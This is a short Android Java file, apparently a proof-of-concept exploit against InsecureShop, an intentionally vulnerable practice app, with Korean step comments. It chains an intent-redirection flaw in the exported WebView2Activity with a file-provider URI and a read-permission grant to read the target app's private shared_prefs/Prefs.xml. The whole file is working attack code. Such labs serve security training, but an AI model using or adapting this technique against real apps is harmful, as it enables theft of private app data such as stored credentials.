package com.insecureshopapp.myapplication;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Step 1: 파일 URI 생성
        Uri targetFileUri = Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml");

        // Step 2: Activity2로 전달될 인텐트 생성
        Intent fileProviderIntent = new Intent();
        fileProviderIntent.setClassName(getPackageName(), "com.insecureshopapp.myapplication.Activity2");
        fileProviderIntent.setData(targetFileUri);
        fileProviderIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        // Step 3: WebView2Activity에 extra_intent로 전달
        Intent webViewBypassIntent = new Intent();
        webViewBypassIntent.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
        webViewBypassIntent.putExtra("extra_intent", fileProviderIntent);

        // Step 4: 취약한 WebView2Activity 실행
        startActivity(webViewBypassIntent);
    }
}